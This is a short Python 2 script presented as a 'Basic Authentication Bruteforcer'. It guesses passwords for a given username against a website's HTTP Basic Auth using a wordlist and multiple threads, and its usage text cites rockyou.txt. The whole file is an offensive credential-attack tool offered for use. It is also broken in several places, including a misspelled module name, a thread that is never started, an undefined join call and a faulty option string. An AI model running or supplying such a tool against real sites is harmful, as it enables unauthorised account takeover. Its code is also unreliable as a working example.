#!/usr/bin/python
from threading import Thread
import sys
import requests
import getopt
import pyfiglet

global hit
hit = "1"

def banner():
	ascii_banner = pyfiglet.figlet_format("Basic Authentication Bruteforcer")
	print(ascii_banner)

def usage():
	print("Usage :")
	print("		-w <url>")
	print("		-u <username>")
	print("		-t <number_of_thread>")
	print("		-f <password_list>")
	print("\nExample : ./basic_authentication.py -w http://www.site.com -u admin -t 5 -f /usr/share/wordlist/rockyou.txt\n\n")




class request_performer(Thread):
	def __init__(self, name, user, url):
		Thread.__init__(self)
		self.password = name.split("\n")[0]
		self.username = user
		self.url = url
		print("-" + self.password + "-")

	def run(self):
		global hit
		if hit == "1":
			try:
				r = request.get(self.url, auth=(self.username, self.password))
				if r.status_code == 200:
					hit = "0"
					print("[+] Password found - " + self.password)
					sys.exit()
				else:
					print("[!!] - " + self.password + " is not valid [!!]")
					i[0] = i[0] - 1

			except Exception, e:
				print("Error : " + e)

def start(argv):
	banner()
	if len(sys.argv) < 5:
		usage()
		sys.exit()
	try:
		opts, args = getopt.getopt(argv, "u:w:f:t")
	except getopt.GetoptError:
		print("[!!] Error on arguments [!!]")
		sys.exit()

	for opt,arg in opts:
		if opt == '-u':
			user = arg
		elif opt == '-w':
			url = arg
		elif opt == '-f':
			passlist = arg
		elif opt == '-t':
			threads = arg

	try:
		f = open(passlist, "r")
		passwords = f.readlines()
	except:
		print("[!!] Can't open the file [!!]")
		sys.exit()

	launcher_thread(passwords, threads, user, url)

def launcher_thread(passwords, th, username, url):
	global i
	i = []
	i.append(0)
	while len(passwords):
		if hit == "1":
			try:
				if i[0] < th:
					passwd = passwords.pop(0)
					i[0] = i[0] + 1
					thread = request_performer(passwd, username, url)
					thread.start
			except KeyboardInterrupt:
				print("[!!] Interrupted [!!]")
				sys.exit
			threads.joint()

if __name__ == "__main__":
	try:
		start(sys.argv[1:])
	except KeyboardInterrupt:
		print("[!!] Interrupted [!!]")

